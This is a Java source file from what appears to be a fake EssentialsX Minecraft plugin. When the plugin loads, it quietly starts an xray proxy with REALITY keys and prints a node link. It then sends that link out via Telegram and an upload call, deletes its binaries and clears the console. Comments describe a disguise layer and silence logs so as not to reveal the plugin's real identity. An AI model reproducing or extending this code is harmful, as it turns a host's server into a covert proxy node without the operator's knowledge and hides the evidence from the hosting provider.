package com.example.essentialsx.common;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 服务主体：加载二进制 → 生成配置 → 拉起 xray → 输出订阅。
 * <p>
 * 启动分两段：
 * <ol>
 *   <li>{@link #start()} 在调用方线程（onEnable）里完成配置加载与伪装层。
 *       伪装层本身已经不再输出伪造启动行，
 *       但保持同步可以让将来重新引入的行为落在正确的位置。</li>
 *   <li>真正拉内核的部分丢到后台线程，不阻塞服务端。</li>
 * </ol>
 */
public final class AppService {

    private final PlatformLogger logger;
    private final AtomicBoolean running = new AtomicBoolean(false);

    private Config config;
    private JnaRunner jnaRunner;
    private ProcessRunner processRunner;

    public AppService(PlatformLogger logger) {
        this.logger = logger;
    }

    /** 可选的运维日志；技术细节由 SHOW_LOG 控制，默认静默。 */
    private void log(String message) {
        if (config != null && !config.showLog) {
            return;
        }
        logger.raw("[EssentialsX] " + message);
    }

    /**
     * 始终输出的日志。
     * <p>
     * 节点链接是使用者唯一能拿走的东西，
     * 不能因为关了 SHOW_LOG 就一起消失。
     */
    private void always(String message) {
        logger.raw(message);
    }

    public void start() {
        if (!running.compareAndSet(false, true)) {
            return;
        }
        config = Config.load();
        Path runtimeDir = config.runtimeDir;

        try {
            Files.createDirectories(runtimeDir);
        } catch (IOException ignored) {
            // 目录已存在或不可建，后续写入会各自报错
        }

        Thread t = new Thread(this::bootstrap, "essentialsx-worker");
        t.setDaemon(true);
        t.start();
    }

    private void bootstrap() {
        try {
            Path runtimeDir = config.runtimeDir;

            RealityKeypair keypair = RealityKeypair.loadOrCreate(
                    runtimeDir.resolve("keypair.properties"), this::log);

            Path configPath = runtimeDir.resolve("config.json");
            String json = new XrayConfig(config, keypair.privateKey).build();
            SecureFiles.writePrivate(configPath, json);
            if (config.showLog) {
                log("xray config written to " + configPath);
            }

            BootBootstrapper boot = new BootBootstrapper(config, this::log);
            boot.launch(json, configPath);

            Thread.sleep(1500);
            if (config.showLog) {
                log("web is running");
            }

            Subscription sub = new Subscription(config, keypair.publicKey);
            String link = sub.writeFiles();
            always(link);
            if (config.showLog) {
                log("Logs will be cleared in " + config.cleanupDelaySeconds
                        + " seconds, copy the node above");
            }

            sub.sendTelegram(this::log);
            sub.upload(this::log);

            scheduleCleanup(runtimeDir);
        } catch (Throwable e) {
            logger.error("EssentialsX background service failed", e);
            running.set(false);
        }
    }

    private void scheduleCleanup(Path runtimeDir) {
        Thread cleanup = new Thread(() -> {
            try {
                Thread.sleep(Math.max(5, config.cleanupDelaySeconds) * 1000L);
                if (!config.keepBinaries) {
                    try (var stream = Files.list(runtimeDir)) {
                        for (Path p : stream.toList()) {
                            String name = p.getFileName().toString();
                            if (name.equals("keypair.properties") || name.equals("sub.txt")) {
                                continue;
                            }
                            Files.deleteIfExists(p);
                        }
                    }
                }
                if (!config.showLog) {
                    clearConsole();
                }
            } catch (Exception e) {
                log("cleanup failed: " + e.getMessage());
            }
        }, "essentialsx-cleanup");
        cleanup.setDaemon(true);
        cleanup.start();
    }

    public void stop() {
        if (!running.compareAndSet(true, false)) {
            return;
        }
        if (jnaRunner != null) {
            jnaRunner.stop();
        }
        if (processRunner != null) {
            processRunner.stop();
        }
        log("xray stopped");
    }

    public boolean isRunning() {
        return running.get();
    }

    /** 负责把内核拉起来：JNA 进程内 或 外部进程。 */
    private final class BootBootstrapper {

        private final Config cfg;
        private final java.util.function.Consumer<String> sink;

        BootBootstrapper(Config cfg, java.util.function.Consumer<String> sink) {
            this.cfg = cfg;
            this.sink = sink;
        }

        void launch(String json, Path configPath) throws IOException {
            if (cfg.nativeMode.equals("process")) {
                launchProcess(configPath);
            } else {
                launchJna(json);
            }
        }

        private void launchJna(String json) throws IOException {
            // 内部技术日志（Using cached / started via JNA）会把插件身份暴露得彻底，
            // 默认丢进空水槽；需要排障时把 SHOW_LOG 打开。
            java.util.function.Consumer<String> quiet = cfg.showLog ? sink : m -> { };
            Path lib = new BinaryStore(cfg, quiet).xray();
            JnaRunner.verifySymbols(lib.toString(), List.of("StartXray", "StopXray"));

            jnaRunner = new JnaRunner(lib.toString(), "StartXray", "StopXray", json, "xray");
            jnaRunner.start(quiet);
        }

        private void launchProcess(Path configPath) {
            String exe = cfg.xrayBinary.isBlank() ? "xray" : cfg.xrayBinary;
            java.util.function.Consumer<String> quiet = cfg.showLog ? sink : m -> { };
            processRunner = new ProcessRunner(exe, List.of("run", "-c", configPath.toString()),
                    "xray", cfg.runtimeDir);
            processRunner.start(quiet);
        }
    }

    /** 清屏；控制台不支持 ANSI 时静默忽略。 */
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {
            // 无 ANSI 支持
        }
    }
}
